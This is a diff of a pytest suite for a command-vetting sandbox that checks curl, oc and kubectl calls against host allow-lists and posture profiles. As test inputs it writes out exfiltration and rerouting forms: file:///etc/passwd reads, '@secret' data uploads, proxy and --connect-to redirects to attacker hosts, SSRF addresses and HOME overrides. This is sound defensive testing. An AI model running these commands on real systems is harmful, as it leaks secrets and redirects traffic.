@@ -1,11 +1,14 @@
 from __future__ import annotations
 
+from dataclasses import replace
 from pathlib import Path
 
 import pytest
 import yaml
 
+from traust_core.v1.context.config import SHIPPED_SAFE_EXEC_PROFILES
 from traust_core.v1.errors import ConfigError, ValidationError
+from traust_core.v1.providers.process import ProcessResult, ProcessRunner
 from traust_core.v1.providers.tools.safe_exec import (
     MAX_RECURSION,
     RECURSION_ENV,
@@ -186,7 +189,7 @@ def test_pipeline_timeout() -> None:
 
 
 def test_a_segment_that_cannot_start_is_127() -> None:
-    rc, out, err = SE.run_segments([("FOO=bar", "echo")], VP)
+    rc, out, err = SE.run_segments([("traust-missing-binary",)], VP)
     assert (rc, out) == (127, "") and err.startswith("[exec failed:")
 
 
@@ -220,17 +223,17 @@ def test_run_segments_never_runs_a_shell_or_env() -> None:
     ],
 )
 def test_curl_exfil_forms_denied(cmd: str) -> None:
-    v = SE.vet_command_string(cmd, VP)
+    v = SE.vet_command_string(cmd, VP, allowed_hosts=("attacker.example", "x"))
     assert not v.ok and "denied under safe_exec" in v.reason
 
 
 def test_curl_probe_forms_still_allowed() -> None:
     for cmd in (
-        "curl -sk https://api.lab:6443/healthz",
+        "curl -sS https://api.lab:6443/healthz",
         "curl -s -d '{\"a\":1}' https://svc.lab/api",
-        "curl -o out.json https://svc.lab/api",
+        "curl -o /dev/null https://svc.lab/api",
     ):
-        v = SE.vet_command_string(cmd, VP)
+        v = SE.vet_command_string(cmd, VP, allowed_hosts=("api.lab", "svc.lab"))
         assert v.ok, (cmd, v.reason)
 
 
@@ -243,6 +246,8 @@ def test_curl_probe_forms_still_allowed() -> None:
         "kubectl --as system:admin delete pod x",
         "oc --server https://other:6443 get pods",
         "oc --insecure-skip-tls-verify get pods",
+        "oc -shttps://other:6443 get pods",
+        "kubectl -Ashttps://other:6443 get pods",
     ],
 )
 def test_kube_override_flags_denied(cmd: str) -> None:
@@ -270,3 +275,389 @@ def test_profiles_cannot_grant_hard_denies_or_shells(granted: str) -> None:
 def test_unknown_profile() -> None:
     with pytest.raises(ConfigError, match="unknown safe_exec profile 'nope'"):
         SE.profile("nope")
+
+
+def test_shipped_validation_profile_has_no_static_targets_or_unscoped_secrets() -> None:
+    profiles = profiles_of(yaml.safe_load(SHIPPED_SAFE_EXEC_PROFILES.read_text()))
+    validation = profiles["validation-step"]
+    assert validation.posture == "restricted"
+    assert validation.curl_allowed_hosts == ()
+    assert validation.keep_env_heads == ("curl", "oc", "kubectl")
+    assert profiles["go-scan"].posture == "baseline"
+
+
+@pytest.mark.parametrize(
+    ("value", "expected"),
+    [
+        ("high", "restricted"),
+        ("medium", "baseline"),
+        ("low", "privileged"),
+        ("restricted", "restricted"),
+        ("baseline", "baseline"),
+        ("privileged", "privileged"),
+    ],
+)
+def test_posture_aliases_and_profile_override(value: str, expected: str) -> None:
+    loaded = profiles_of(
+        {
+            "defaults": {"posture": value},
+            "profiles": {"default": {"allow": ["curl"]}, "override": {"posture": "low"}},
+        }
+    )
+    assert loaded["default"].posture == expected
+    assert loaded["override"].posture == "privileged"
+
+
+@pytest.mark.parametrize("hosts", [["*.example"], ["bad?host"], [""], ["http://user@host"]])
+def test_invalid_hosts_fail_closed(hosts: list[str]) -> None:
+    with pytest.raises(ConfigError, match="invalid curl allowed host"):
+        profiles_of({"profiles": {"x": {"curl_allowed_hosts": hosts}}})
+    assert not SE.validate_argv(["curl", "https://example.org"], VP, allowed_hosts=hosts).ok
+
+
+def test_invalid_posture_and_unscoped_restricted_pipeline_refused() -> None:
+    with pytest.raises(ConfigError, match="posture"):
+        profiles_of({"defaults": {"posture": "surprise"}, "profiles": {}})
+    with pytest.raises(ConfigError, match="keep_env_heads"):
+        profiles_of({"profiles": {"x": {"posture": "high", "allow_pipelines": True}}})
+
+
+def test_restricted_hosts_are_exact_normalized_and_union_profile_and_call() -> None:
+    p = replace(VP, curl_allowed_hosts=("one.example",))
+    for url in ("https://ONE.Example.:443/a", "http://two.example/a"):
+        assert SE.validate_argv(["curl", url], p, allowed_hosts=("https://TWO.EXAMPLE:80",)).ok
+    for url in ("http://one.example.evil.test", "http://127.0.0.1", "http://user@one.example"):
+        assert not SE.validate_argv(["curl", url], p, allowed_hosts=("two.example",)).ok
+    assert not SE.validate_argv(["curl", "https://one.example"], VP).ok
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://localhost/",
+        "http://127.1/",
+        "http://0x7f000001/",
+        "http://[::1]/",
+        "http://10.0.0.1/",
+        "http://api.svc/",
+        "http://metadata/",
+        "http://db.internal/",
+    ],
+)
+def test_baseline_denies_internal_unless_explicitly_allowed(url: str) -> None:
+    p = replace(VP, posture="baseline")
+    assert not SE.validate_argv(["curl", url], p).ok
+    host = url.removeprefix("http://").removesuffix("/")
+    assert SE.validate_argv(["curl", url], p, allowed_hosts=(host,)).ok
+
+
+def test_baseline_and_privileged_public_behavior() -> None:
+    for posture in ("baseline", "privileged"):
+        p = replace(VP, posture=posture)
+        assert SE.validate_argv(["curl", "https://example.org"], p).ok
+    p = replace(VP, posture="privileged")
+    assert SE.validate_argv(["curl", "-L", "http://localhost"], p).ok
+    assert not SE.validate_argv(
+        ["curl", "-L", "http://localhost"], p, allowed_hosts=("localhost",)
+    ).ok
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["-sL", "http://example.org"],
+        ["--location", "http://example.org"],
+        ["--proxy", "http://proxy", "http://example.org"],
+        ["-sxhttp://proxy", "http://example.org"],
+        ["--connect-to", "example.org:80:127.0.0.1:1234", "http://example.org"],
+        ["--resolve", "example.org:80:127.0.0.1", "http://example.org"],
+        ["--url", "file:///etc/passwd"],
+        ["-sFoops", "http://example.org"],
+        ["--data", "ok", "--data", "@secret", "http://example.org"],
+        ["--header=@secret", "http://example.org"],
+        ["--output=secret", "http://example.org"],
+        ["--write-out=%output{file}", "http://example.org"],
+        ["http://example.org", "--unknown-option"],
+        ["--url", "http://example.org/{a,b}"],
+    ],
+)
+def test_curl_option_walker_denies_routing_and_exfiltration(args: list[str]) -> None:
+    assert not SE.validate_argv(["curl", *args], VP, allowed_hosts=("example.org",)).ok
+
+
+def test_curl_parser_handles_clusters_values_and_end_of_options() -> None:
+    for args in (
+        ["-sS", "-o/dev/null", "-w%{http_code}", "https://example.org"],
+        ["--url=https://example.org", "--data", "inline"],
+        ["--", "https://example.org/path"],
+    ):
+        assert SE.validate_argv(["curl", *args], VP, allowed_hosts=("example.org",)).ok
+
+
+@pytest.mark.parametrize(
+    "name",
+    ["http_proxy", "HTTPS_PROXY", "ALL_PROXY", "no_proxy", "KUBECONFIG", "RES_OPTIONS"],
+)
+def test_target_environment_cannot_redirect_or_override_identity(name: str) -> None:
+    assert not SE.validate_argv(
+        [f"{name}=http://attacker:8080", "curl", "http://approved.example"],
+        VP,
+        allowed_hosts=("approved.example",),
+    ).ok
+    assert SE.run_segments([(f"{name}=evil", "curl", "http://approved.example")], VP)[0] == 126
+
+
+def test_target_home_cannot_redirect_the_default_kubeconfig() -> None:
+    argv = ["HOME=/attacker", "kubectl", "get", "pods"]
+    assert not SE.validate_argv(argv, VP).ok
+    assert not SE.vet_command_string("HOME=/attacker kubectl get pods", VP).ok
+    assert SE.run_segments([argv], VP)[0] == 126
+
+
+@pytest.mark.parametrize("posture", ["restricted", "baseline", "privileged"])
+@pytest.mark.parametrize("header", ["Host: other.example", "host;", ":authority: other.example"])
+@pytest.mark.parametrize("option", ["-H", "--header"])
+def test_vetted_curl_cannot_override_an_enforced_host(
+    posture: str, header: str, option: str
+) -> None:
+    p = replace(VP, posture=posture)
+    argv = ["curl", option, header, "https://approved.example"]
+    assert not SE.validate_argv(argv, p, allowed_hosts=("approved.example",)).ok
+    assert SE.validate_argv(
+        ["curl", option, "Accept: application/json", "https://approved.example"],
+        p,
+        allowed_hosts=("approved.example",),
+    ).ok
+
+
+@pytest.mark.parametrize(
+    "option", ["-HHost: other.example", "-sHHost: other.example", "--header=Host: other.example"]
+)
+def test_vetted_curl_cannot_hide_host_override_in_attached_option(option: str) -> None:
+    assert not SE.validate_argv(
+        ["curl", option, "https://approved.example"], VP, allowed_hosts=("approved.example",)
+    ).ok
+
+
+def test_vetted_curl_rejects_absolute_request_targets_under_host_policy() -> None:
+    argv = [
+        "curl",
+        "--request-target",
+        "http://other.example/",
+        "--url",
+        "https://approved.example",
+    ]
+    assert not SE.validate_argv(argv, VP, allowed_hosts=("approved.example",)).ok
+    assert not SE.validate_argv(
+        ["curl", "--request-target=http://other.example/", "--url", "https://approved.example"],
+        VP,
+        allowed_hosts=("approved.example",),
+    ).ok
+    privileged = replace(VP, posture="privileged")
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments([argv], privileged, curl_stdin_headers=("Authorization: Bearer secret",))
+
+
+def test_prefixes_execute_and_are_per_segment() -> None:
+    se = SafeExec({"t": profile("printenv", "grep", pipelines=True)}, depth=0)
+    rc, out, _ = se.run("FIRST=one printenv | SECOND=two grep FIRST", "t")
+    assert (rc, out.strip()) == (0, "FIRST=one")
+
+
+def test_curl_disables_rc_and_drops_inherited_proxy(monkeypatch: pytest.MonkeyPatch) -> None:
+    captured = {}
+
+    def fake_run(self: ProcessRunner, argv: list[str], **kwargs: object) -> ProcessResult:
+        captured["argv"] = argv
+        captured["env"] = kwargs["env"]
+        return ProcessResult(tuple(argv), 0, b"ok", b"", 0)
+
+    monkeypatch.setattr(ProcessRunner, "run", fake_run)
+    for name in (
+        "http_proxy",
+        "https_proxy",
+        "ALL_PROXY",
+        "NO_PROXY",
+        "CURL_HOME",
+        "SSL_CERT_FILE",
+    ):
+        monkeypatch.setenv(name, "http://attacker:8080")
+    p = replace(
+        VP, keep_env=(*VP.keep_env, "http_proxy", "ALL_PROXY", "CURL_HOME", "SSL_CERT_FILE")
+    )
+    se = SafeExec({"p": p}, depth=0)
+    assert (
+        se.run(["curl", "http://approved.example"], "p", allowed_hosts=("approved.example",))[0]
+        == 0
+    )
+    assert captured["argv"][:2] == ["curl", "-q"]
+    assert not any(k.lower().endswith("_proxy") for k in captured["env"])
+    assert "CURL_HOME" not in captured["env"] and "SSL_CERT_FILE" not in captured["env"]
+    with pytest.raises(ValidationError, match="protected"):
+        se.run(
+            ["curl", "http://approved.example"],
+            "p",
+            allowed_hosts=("approved.example",),
+            extra_env={"all_proxy": "http://attacker"},
+        )
+
+
+def test_scoped_environment_and_trusted_http_binding(monkeypatch: pytest.MonkeyPatch) -> None:
+    captured = {}
+
+    def fake_run(self: ProcessRunner, argv: list[str], **kwargs: object) -> ProcessResult:
+        captured.update(argv=argv, env=kwargs["env"], stdin=kwargs["stdin"])
+        return ProcessResult(tuple(argv), 0, b"ok", b"", 0)
+
+    monkeypatch.setattr(ProcessRunner, "run", fake_run)
+    monkeypatch.setenv("VF_OAUTH_TOKEN", "canary")
+    result = SE.run_segments(
+        [("curl", "--disable", "--url", "http://approved.example:8080/")],
+        VP,
+        allowed_hosts=("approved.example",),
+        curl_connect_to=("approved.example", 8080, 19000),
+        curl_stdin_headers=("Authorization: Bearer canary",),
+    )
+    assert result[0] == 0
+    assert captured["stdin"] == b"Authorization: Bearer canary\n"
+    assert "canary" not in str(captured["argv"])
+    assert "approved.example:8080:127.0.0.1:19000" in captured["argv"]
+    assert captured["env"]["VF_OAUTH_TOKEN"] == "canary"
+    with pytest.raises(ValidationError, match="headers"):
+        SE.run_segments(
+            [("curl", "--url", "http://approved.example")],
+            VP,
+            input_="x",
+            allowed_hosts=("approved.example",),
+            curl_stdin_headers=("X: secret",),
+        )
+    with pytest.raises(ValidationError, match="binding"):
+        SE.run_segments(
+            [("curl", "--url", "http://approved.example")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_connect_to=("other.example", 80, 10),
+        )
+    with pytest.raises(ValidationError, match="binding"):
+        SE.run_segments(
+            [("curl", "--url", "http://approved.example:8080/")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_connect_to=("approved.example", 80, 10),
+        )
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments(
+            [("curl", "--url", "http://approved.example", "http://approved.example/other")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_connect_to=("approved.example", 80, 10),
+        )
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments(
+            [("curl", "-sv", "--url", "http://approved.example")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_stdin_headers=("X: secret",),
+        )
+
+
+@pytest.mark.parametrize(
+    "option", ["-k", "-sk", "-1", "--insecure", "--cacert=/tmp/ca", "--capath=/tmp", "--alpn"]
+)
+def test_untrusted_curl_cannot_override_tls(option: str) -> None:
+    assert not SE.validate_argv(
+        ["curl", option, "https://approved.example"], VP, allowed_hosts=("approved.example",)
+    ).ok
+
+
+@pytest.mark.parametrize("header", ["Host: other.example", "host;", ":authority: other.example"])
+def test_private_headers_cannot_be_routed_by_untrusted_authority(header: str) -> None:
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments(
+            [("curl", "-H", header, "--url", "https://approved.example")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_stdin_headers=("X-Api-Key: secret",),
+        )
+
+
+def test_private_headers_reject_redirects_even_for_privileged_profile() -> None:
+    p = replace(VP, posture="privileged")
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments(
+            [("curl", "-L", "--url", "https://approved.example")],
+            p,
+            curl_stdin_headers=("X-Api-Key: secret",),
+        )
+
+
+def test_operator_tls_options_are_injected_only_on_bound_requests(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    captured = {}
+
+    def fake_run(self: ProcessRunner, argv: list[str], **kwargs: object) -> ProcessResult:
+        captured["argv"] = argv
+        return ProcessResult(tuple(argv), 0, b"", b"", 0)
+
+    monkeypatch.setattr(ProcessRunner, "run", fake_run)
+    argv = ("curl", "--url", "https://approved.example")
+    assert (
+        SE.run_segments(
+            [argv], VP, allowed_hosts=("approved.example",), curl_ca_bundle="/etc/ssl/ca.pem"
+        )[0]
+        == 0
+    )
+    assert "--cacert" in captured["argv"] and "/etc/ssl/ca.pem" in captured["argv"]
+    with pytest.raises(ValidationError, match="lab authorization"):
+        SE.run_segments([argv], VP, allowed_hosts=("approved.example",), curl_insecure_tls=True)
+    assert (
+        SE.run_segments(
+            [argv],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_insecure_tls=True,
+            curl_insecure_lab=True,
+            curl_stdin_headers=("X: secret",),
+            curl_connect_to=("approved.example", 443, 1234),
+        )[0]
+        == 0
+    )
+    assert "--insecure" in captured["argv"]
+    assert "approved.example:443:127.0.0.1:1234" in captured["argv"]
+    with pytest.raises(ValidationError, match="CA bundle"):
+        SE.run_segments([argv], VP, allowed_hosts=("approved.example",), curl_ca_bundle="relative")
+    with pytest.raises(ValidationError, match="request"):
+        SE.run_segments(
+            [("curl", "https://approved.example")],
+            VP,
+            allowed_hosts=("approved.example",),
+            curl_ca_bundle="/etc/ssl/ca.pem",
+        )
+
+
+def test_pipeline_scopes_secrets_and_extra_env_to_selected_heads(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    captured = {}
+
+    def fake_pipeline(
+        self: ProcessRunner, segments: list[list[str]], **kwargs: object
+    ) -> tuple[ProcessResult, ...]:
+        captured["envs"] = kwargs["segment_envs"]
+        return tuple(ProcessResult(tuple(seg), 0, b"", b"", 0) for seg in segments)
+
+    monkeypatch.setattr(ProcessRunner, "pipeline", fake_pipeline)
+    monkeypatch.setenv("VF_OAUTH_TOKEN", "canary")
+    assert (
+        SE.run(
+            "curl http://approved.example | grep ok",
+            "validation-step",
+            allowed_hosts=("approved.example",),
+            extra_env={"EXTRA_SECRET": "secret"},
+        )[0]
+        == 0
+    )
+    first, second = captured["envs"]
+    assert first["VF_OAUTH_TOKEN"] == "canary" and first["EXTRA_SECRET"] == "secret"
+    assert "VF_OAUTH_TOKEN" not in second and "EXTRA_SECRET" not in second
